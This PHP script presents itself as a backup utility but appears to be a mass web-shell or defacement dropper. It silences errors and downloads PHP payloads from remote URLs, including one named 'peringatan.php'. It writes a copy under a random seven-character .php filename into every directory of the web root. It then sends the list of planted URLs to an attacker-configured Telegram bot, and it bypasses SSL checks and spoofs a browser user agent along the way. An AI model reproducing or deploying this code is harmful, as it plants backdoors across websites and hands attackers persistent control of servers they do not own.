<?php
error_reporting(0);

// ================= CONFIGURATION ================= //
$searchDir = $_SERVER['DOCUMENT_ROOT'];
$sourceUrls = [
    "https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/peringatan.php",
    "https://raw.githubusercontent.com/example/source2/main/backup.php",
    "https://raw.githubusercontent.com/example/source3/main/backup.php"
];
$baseUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'];
$logFile = "copy_report_" . date('Y-m-d_His') . ".txt";

// Telegram Configuration - REPLACE WITH YOUR OWN VALUES
$telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN';
$telegramChatID = 'YOUR_CHAT_ID';
// ================================================= //

/**
 * Generate random filename (7 alphanumeric characters + .php extension)
 */
function generateRandomName($length = 7) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString . '.php';
}

/**
 * Fetch content from URL with multiple fallback methods
 */
function fetchContent($url) {
    // Try with cURL first
    if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
        
        $data = curl_exec($ch);
        if (!curl_errno($ch)) {
            curl_close($ch);
            return $data;
        }
        curl_close($ch);
    }
    
    // Try with file_get_contents
    $options = [
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false,
        ],
        'http' => [
            'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'follow_location' => 1
        ]
    ];
    
    $context = stream_context_create($options);
    $data = @file_get_contents($url, false, $context);
    if ($data !== false) {
        return $data;
    }
    
    // Final fallback to wget (Linux servers only)
    if (function_exists('shell_exec') && stripos(PHP_OS, 'win') === false) {
        $wget = @shell_exec("which wget");
        if (!empty($wget)) {
            $tmpFile = tempnam(sys_get_temp_dir(), 'wget');
            @shell_exec("wget --no-check-certificate -q -O " . escapeshellarg($tmpFile) . " " . escapeshellarg($url));
            if (file_exists($tmpFile)) {
                $data = file_get_contents($tmpFile);
                unlink($tmpFile);
                return $data;
            }
        }
    }
    
    return false;
}

/**
 * Send file to Telegram with caption
 */
function sendFileToTelegram($filePath, $caption, $botToken, $chatID) {
    $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendDocument";
    
    // Check if file exists and is readable
    if (!file_exists($filePath) || !is_readable($filePath)) {
        return false;
    }
    
    $postFields = [
        'chat_id' => $chatID,
        'caption' => $caption,
        'document' => new CURLFile($filePath)
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return $httpCode === 200;
}

/**
 * Main function to copy files to all directories
 */
function copyToAllDirectories($dir, $urls, $logFile, $baseUrl, $telegramConfig) {
    if (!is_dir($dir)) {
        file_put_contents($logFile, "[ERROR] Directory not found: $dir\n", FILE_APPEND);
        return;
    }

    $files = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    
    $logEntries = [];
    $contents = [];

    // Fetch all source contents
    foreach ($urls as $url) {
        $content = fetchContent($url);
        if ($content !== false && !empty($content)) {
            $contents[] = $content;
        }
    }

    if (empty($contents)) {
        file_put_contents($logFile, "[ERROR] Could not fetch any content from sources\n", FILE_APPEND);
        return;
    }

    // Process each directory
    foreach ($files as $file) {
        if ($file->isDir()) {
            $randomFileName = generateRandomName();
            $filePath = $file->getPathname() . "/" . $randomFileName;
            $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $filePath);
            $fullUrl = $baseUrl . $relativePath;

            if (file_exists($filePath)) {
                $logEntry = "[SKIPPED] $fullUrl Already Exist";
                $logEntries[] = $logEntry;
                continue;
            }

            $randomContent = $contents[array_rand($contents)];
            
            if (file_put_contents($filePath, $randomContent) !== false) {
                $logEntry = "[COPIED] $fullUrl";
                $logEntries[] = $logEntry;
            } else {
                $logEntry = "[ERROR] Failed to create: $fullUrl";
                $logEntries[] = $logEntry;
            }
        }
    }

    // Save log to file
    if (!empty($logEntries)) {
        $logContent = implode("\n", $logEntries);
        file_put_contents($logFile, $logContent . "\n", FILE_APPEND);
        
        // Prepare Telegram message
        $caption = "📁 Backup Report\n";
        $caption .= "🌐 Domain: " . $baseUrl . "\n";
        $caption .= "📅 Date: " . date('Y-m-d H:i:s') . "\n\n";
        
        $stats = [
            'COPIED' => 0,
            'SKIPPED' => 0,
            'ERROR' => 0
        ];
        
        foreach ($logEntries as $entry) {
            if (strpos($entry, '[COPIED]') !== false) $stats['COPIED']++;
            if (strpos($entry, '[SKIPPED]') !== false) $stats['SKIPPED']++;
            if (strpos($entry, '[ERROR]') !== false) $stats['ERROR']++;
        }
        
        $caption .= "📊 Statistics:\n";
        $caption .= "✅ Copied: " . $stats['COPIED'] . "\n";
        $caption .= "⏩ Skipped: " . $stats['SKIPPED'] . "\n";
        $caption .= "❌ Errors: " . $stats['ERROR'] . "\n";
        
        // Send to Telegram
        sendFileToTelegram(
            $logFile,
            $caption,
            $telegramConfig['botToken'],
            $telegramConfig['chatID']
        );
    }
}

// ================= EXECUTION ================= //
$startTime = microtime(true);
file_put_contents($logFile, "=== Backup Process Started ===\n", FILE_APPEND);
file_put_contents($logFile, "Date: " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
file_put_contents($logFile, "Domain: " . $baseUrl . "\n\n", FILE_APPEND);

// Telegram configuration
$telegramConfig = [
    'botToken' => $telegramBotToken,
    'chatID' => $telegramChatID
];

// Run the main function
copyToAllDirectories($searchDir, $sourceUrls, $logFile, $baseUrl, $telegramConfig);

// Finalize log
$executionTime = round(microtime(true) - $startTime, 2);
file_put_contents($logFile, "\n=== Process Completed ===\n", FILE_APPEND);
file_put_contents($logFile, "Execution time: " . $executionTime . " seconds\n", FILE_APPEND);
// ============================================ //
?>